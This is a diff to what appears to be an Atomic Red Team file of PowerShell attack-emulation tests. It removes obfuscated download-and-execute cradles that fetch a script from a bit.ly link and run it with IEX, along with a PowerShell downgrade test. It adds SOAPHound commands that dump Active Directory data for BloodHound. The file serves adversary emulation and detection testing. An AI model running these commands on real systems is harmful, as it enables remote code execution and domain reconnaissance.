@@ -60,18 +60,6 @@ atomic_tests:
     cleanup_command: |
       Remove-Item $env:Temp\*BloodHound.zip -Force
     name: powershell
-- name: Obfuscation Tests
-  auto_generated_guid: 4297c41a-8168-4138-972d-01f3ee92c804
-  description: |
-    Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
-  supported_platforms:
-  - windows
-  executor:
-    command: |
-      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
-      (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
-      Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
-    name: powershell
 - name: Mimikatz - Cradlecraft PsSendKeys
   auto_generated_guid: af1800cf-9f9d-4fd1-a709-14b1e6de020d
   description: |
@@ -173,25 +161,6 @@ atomic_tests:
     cleanup_command: |
       Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
       Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore
-    name: powershell
-- name: PowerShell Downgrade Attack
-  auto_generated_guid: 9148e7c4-9356-420e-a416-e896e9c0f73e
-  description: |
-    This test requires the manual installation of PowerShell V2.
-
-    Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
-  supported_platforms:
-  - windows
-  dependencies:
-  - description: |
-      PowerShell version 2 must be installed
-    prereq_command: |
-      if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}
-    get_prereq_command: |
-      Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually
-  executor:
-    command: |
-      powershell.exe -version 2 -Command Write-Host $PSVersion
     name: powershell
 - name: NTFS Alternate Data Stream Access
   auto_generated_guid: 8e5c5532-1181-4c1d-bb79-b3a9f5dbd680
@@ -436,3 +405,80 @@ atomic_tests:
       function nslookup  { &"$env:windir\system32\nslookup.exe" @args | Out-Null; @("","whoami")}
       powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
     name: powershell
+- name: SOAPHound - Dump BloodHound Data
+  auto_generated_guid: 6a5b2a50-d037-4879-bf01-43d4d6cbf73f
+  description: |
+    Dump BloodHound data using SOAPHound. Upon execution, BloodHound data will be dumped and stored in the specified output directory.
+    src: https://github.com/FalconForceTeam/SOAPHound
+  supported_platforms:
+  - windows
+  input_arguments:
+    user:
+      description: Username for authentication
+      type: string
+      default: $env:USERNAME
+    password:
+      description: Password for authentication
+      type: string
+      default: P@ssword1
+    domain:
+      description: Domain for authentication
+      type: string
+      default: $env:USERDOMAIN
+    dc:
+      description: Domain Controller IP
+      type: string
+      default: 10.0.1.14
+    cachefilename:
+      description: Cache filename
+      type: string
+      default: c:\temp\cache.txt
+    outputdirectory:
+      description: Output directory
+      type: string
+      default: c:\temp\test2
+    soaphound_path:
+      description: Path to SOAPHound binary
+      type: string
+      default: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe
+  executor:
+    command: |
+      #{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}
+    name: powershell
+- name: SOAPHound - Build Cache
+  auto_generated_guid: 4099086c-1470-4223-8085-8186e1ed5948
+  description: |
+    Build cache using SOAPHound. Upon execution, a cache will be built and stored in the specified cache filename.
+    src: https://github.com/FalconForceTeam/SOAPHound
+  supported_platforms:
+  - windows
+  input_arguments:
+    user:
+      description: Username for authentication
+      type: string
+      default: $env:USERNAME
+    password:
+      description: Password for authentication
+      type: string
+      default: P@ssword1
+    domain:
+      description: Domain for authentication
+      type: string
+      default: $env:USERDOMAIN
+    dc:
+      description: Domain Controller IP
+      type: string
+      default: 10.0.1.14
+    cachefilename:
+      description: Cache filename
+      type: string
+      default: c:\temp\cache.txt
+    soaphound_path:
+      description: Path to SOAPHound binary
+      type: string
+      default: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe
+  executor:
+    command: |
+      #{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
+    name: powershell
+
